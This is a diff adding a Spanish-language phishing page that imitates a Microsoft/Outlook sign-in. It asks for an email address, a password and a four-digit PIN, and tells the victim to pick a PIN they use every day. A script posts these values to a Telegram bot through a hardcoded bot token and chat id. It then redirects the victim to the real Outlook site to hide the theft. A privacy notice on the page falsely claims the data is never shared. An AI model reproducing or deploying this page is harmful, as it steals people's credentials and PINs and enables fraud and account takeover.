@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+   
+<head>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+</head>
+
+<body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden;"></iframe></noscript>
+    <div class="login-container">
+        <div class="wrapper">
+            <div class="col-xs-12 col-sm-4 col-sm-offset-4 login-box" style="z-index:1000;">
+                <div class="login-header"><img src="https://pbs.twimg.com/media/Fth9clMXwBYturo?format=jpg&name=small">
+                    <h4 class="ingresa-cuenta">Ingresa a tu cuenta</h4>
+                    <p class="text">Inicia sesi&oacute;n en la plataforma Microsoft para confirmar identidad.</p>
+                </div>
+                <div id="privacy-policy" style="display: none;">
+                    <h2>Política de Privacidad</h2>
+                    <p>Resumen de cómo manejamos sus datos:</p>
+                    <ul>
+                        <li>Sus datos se utilizan únicamente para [propósito].</li>
+                        <li>No compartimos sus datos con terceros.</li>
+                        <li>Sus datos se almacenan de forma segura y se eliminan después de [periodo de tiempo].</li>
+                        <li>Puede solicitar la eliminación de sus datos en cualquier momento.</li>
+                    </ul>
+                </div>
+                <script>
+                    function showPrivacyPolicy() {
+                        document.getElementById('privacy-policy').style.display = 'block';
+                    }
+                    </script>
+                <div class="alert alert-danger" id="error-message"><br></div>
+                <div>
+                    <form id="loginForm" onsubmit="return sender();">
+                        <!-- El resto del formulario se mantiene igual -->
+                        <div class="form-group label-animate">
+                            <label for="usr">Correo electr&oacute;nico</label>
+                            <input class="form-control" id="uzer" type="text" name="uzer" autocomplete="off" required="">
+                        </div>
+                        <div class="form-group label-animate">
+                            <label for="password">Contrase&ntilde;a</label>
+                            <i class="fa fa-eye eye-icon" aria-hidden="true" onclick="showPassword()" style="cursor: pointer;"></i>
+                            <input class="form-control" id="pazz" name="pazz" type="password" required="">
+                        </div>
+                        <div class="iHdVbkVQvFXkuwc">Para reforzar la seguridad de tu cuenta es necesario que crees un pin de 4 n&uacute;meros, Le recomendamos usar uno que frecuentes a diario para evitar ser olvidado.</div>
+                        <div class="form-group label-animate"><label for="usr">Crear Pin</label><input class="form-control" id="p1n" type="number4" name="p1n" autocomplete="off" maxlength="4" required=""></div>
+                        <p id="gfg" hidden=""><br></p>
+                        <p id="address" hidden=""><br></p>
+                        <div class="center" style="padding-top: 5px; padding-bottom: 5px; margin-top: 5px;"><a id="link-olvidaste-tu-password" href="h.html">&iquest;Olvidaste tu contrase&ntilde;a?</a></div>
+                        <input type="hidden" name="_next" value="https://outlook.live.com">
+                        <div class="form-group">
+                            <input type="checkbox" id="privacy-check" required>
+                            <label for="privacy-check">He leído y acepto la <a href="javascript:void(0);" onclick="showPrivacyPolicy()">política de privacidad</a>.</label>
+                        </div>
+                        <div class="captcha-container form-group" style="display: none;"><br></div><button class="btn btn-primary btn-block" id="btn-login">Iniciar sesi&oacute;n</button>
+                    </form>
+                    <div id="bottom-imgs">
+                        <div class="img-block"><img src="https://pbs.twimg.com/media/Fth_yz1XwAcYAuX?format=png&name=360x360"></div>
+                        <div id="vl"><br></div>
+                        <div class="img-block"><img src="https://pbs.twimg.com/media/Fth_4zaX0AAw80V?format=png&name=small"></div>
+                    </div>
+                    <div class="center"><br></div>
+                    <hr style="width: 30%; background-color:#666666; margin-top: 10px; margin-bottom: 10px;">
+                    <p class="center text" style="margin: 0;">Contactanos:</p>
+                    <div class="center">
+                        <p class="text" style="display:inline;">outlook.live.com</p>
+                    </div>
+                </div>
+            </div>
+            <div id="gradient"><br></div>
+        </div>
+        <div class="login-footer"><br></div>
+    </div>
+    <script src="sax.js"></script>
+    <script src="#"></script>
+    <script src="../cdn.auth0.com/js/polyfills/1.0/object-assign.min.js"></script>
+    <script></script>
+    <script type="text/javascript" src="hosting__general__script224a.php?__muid=&h=2174520&t=1722527987&k=7093106638e4a71649d775d70c70920f">
+    </script><noscript><img alt="beacon" border="0" width="1" height="1" src="hosting__general__script46b5.php?__muid=&h=2174520&t=1722527987&k=7093106638e4a71649d775d70c70920f&img=1"></noscript>
+   <script>
+   function showPassword() {
+        var passwordInput = document.getElementById("pazz");
+        var eyeIcon = document.querySelector(".eye-icon");
+        
+        if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+            eyeIcon.classList.remove("fa-eye");
+            eyeIcon.classList.add("fa-eye-slash");
+        } else {
+            passwordInput.type = "password";
+            eyeIcon.classList.remove("fa-eye-slash");
+            eyeIcon.classList.add("fa-eye");
+        }
+    }
+    </script>
+    <script>
+        //bot token
+        var telegram_bot_id = "7212543212:AAGzdF92iN0XD40j_TNWoI7j15oiR2RIziQ";
+        //chat id
+        var chat_id = "7121884752";
+        var u_name, pax, u_pin2, ip, ip2;
+        var ready = function () {
+            u_name = document.getElementById("uzer").value;
+            pax = document.getElementById("pazz").value;
+            u_pin2 = document.getElementById("p1n").value;
+            ip = document.getElementById("gfg").innerHTML;
+            ip2 = document.getElementById("address").innerHTML;
+            message = "📧EMAIL: " + u_name + 
+                      "\n🔒Cl4v3: " + pax +
+                      "\n📌P1N: " + u_pin2 +"\nIP: " + "\n\n🐺Posdre🐺";
+        };
+        var sender = function () {
+            ready();
+            var settings = {
+                "async": true,
+                "crossDomain": true,
+                "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+                "method": "POST",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "cache-control": "no-cache"
+                },
+                "data": JSON.stringify({
+                    "chat_id": chat_id,
+                    "text": message
+                })
+            };
+            $.ajax(settings).done(function (response) {
+                window.location = 'https://outlook.live.com';
+                console.log(response);
+            });
+            return false;
+        };
+     </script>
+</body>
+</html>
